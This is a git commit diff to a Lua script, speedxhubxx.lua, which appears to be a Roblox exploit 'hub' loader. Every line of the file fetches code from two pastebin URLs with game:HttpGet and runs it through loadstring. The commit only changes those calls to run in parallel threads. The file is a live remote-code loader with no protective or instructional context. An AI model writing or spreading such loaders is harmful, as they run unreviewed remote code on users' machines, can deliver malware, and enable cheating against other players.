110dc8d94a31dffdfb02f9eef652fa3b44c728af
efxxkw <gustavo941419@gmail.com>
2025-01-29 19:59:35 -0300

    Update speedxhubxx.lua

--- speedxhubxx.lua
+++ speedxhubxx.lua
@@ -1,3 +1,7 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/JhMqGGfF", true))()
-wait(1)
-loadstring(game:HttpGet("https://pastebin.com/eF2DUrNp", true))()
+spawn(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/JhMqGGfF", true))()
+end)
+
+spawn(function()
+    loadstring(game:HttpGet("https://pastebin.com/eF2DUrNp", true))()
+end)
